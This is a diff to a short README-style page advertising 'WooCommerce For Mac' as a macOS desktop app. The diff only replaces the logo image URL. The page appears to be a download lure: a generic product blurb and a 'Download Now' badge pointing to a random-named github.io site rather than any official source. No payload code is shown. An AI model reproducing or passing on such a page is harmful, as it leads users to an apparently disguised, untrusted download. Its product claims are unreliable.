@@ -1,5 +1,5 @@
 # WooCommerce For Mac — Download For Mac OS 😊
-![logo](https://store.webkul.com/media/catalog/product/cache/1/image/9df78eab33525d08d6e5fb8d27136e95/w/e/webkul_store_woocommerce_pos_macintosh_desktop_app_1__1.png)
+![logo](https://elbnetz.com/wp-content/uploads/2024/12/Was-ist-WooCommerce.png)
 WooCommerce For Mac is a powerful desktop application designed to manage your e-commerce store directly from your Mac. Built for macOS users, this app simplifies product management, order tracking, and sales analytics for WooCommerce store owners. Follow the instructions below to install WooCommerce For Mac and streamline your online business operations.
 
 [![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/woocom)
